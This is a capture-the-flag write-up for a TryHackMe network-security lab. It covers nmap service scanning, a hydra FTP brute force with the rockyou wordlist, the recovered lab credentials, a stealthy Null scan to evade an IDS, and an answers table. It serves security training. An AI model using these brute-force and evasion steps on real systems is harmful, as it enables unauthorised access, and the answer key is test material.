# TryHackMe: Net Sec Challenge Writeup

**Room Link:** [Net Sec Challenge](https://tryhackme.com/room/netsecchallenge)

---

## Overview

This challenge tests mastery of the Network Security module. All questions can be solved using only `nmap`, `telnet`, and `hydra`.

## Initial Enumeration

Starting with a basic Nmap scan:

```
nmap <target-ip>
```

**Results:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

Visiting the HTTP server on port 80 returns a simple "Hello, world!" page. Running `ffuf` for directory enumeration finds nothing useful.

## Aggressive Scan

Running a full port, aggressive scan to enumerate services and grab banners:

```
nmap -sCV -A -T5 -p- <target-ip>
```

This reveals critical information:

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         SSH-2.0-OpenSSH_8.2p1 THM{redacted}
80/tcp    open  http        lighttpd THM{redacted}
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
8080/tcp  open  http        Node.js (Express middleware)
10021/tcp open  ftp         vsftpd 3.0.5
```

Key findings from the scan:
- **SSH server header flag:** found in the banner (redacted — solve to get the exact value)
- **HTTP server header flag:** found in the banner (redacted — solve to get the exact value)
- **Hidden FTP service** on non-standard port `10021` running `vsftpd 3.0.5`

## FTP Brute Force

The room provides two usernames obtained via social engineering: `eddie` and `quinn`. Anonymous FTP login is disabled.

Using Hydra to brute force FTP credentials:

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>:10021
```

**Results:**
```
[10021][ftp] host: <target-ip>   login: eddie   password: jordan
[10021][ftp] host: <target-ip>   login: quinn   password: andrea
```

## Retrieving the FTP Flag

Logging in as `quinn` via FTP:

```
ftp <target-ip> -p 10021
# Username: quinn
# Password: andrea
ftp> ls
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
ftp> more ftp_flag.txt
THM{redacted}
```

## IDS Evasion Challenge

Browsing to `http://<target-ip>:8080` presents a challenge: scan the target as covertly as possible to avoid IDS detection.

Running a TCP Null scan:

```
nmap -sN <target-ip>
```

After the scan completes, the web page reveals the flag (redacted — solve to get the exact value).

## Challenge Answers

| Question | Answer |
|----------|--------|
| Highest open port below 10,000? | `8080` |
| Open port above 10,000? | `10021` |
| How many TCP ports are open? | `6` |
| Flag in HTTP server header? | *(redacted)* |
| Flag in SSH server header? | *(redacted)* |
| FTP server version? | `vsftpd 3.0.5` |
| Flag from FTP account? | *(redacted)* |
| Flag from the IDS challenge? | *(redacted)* |
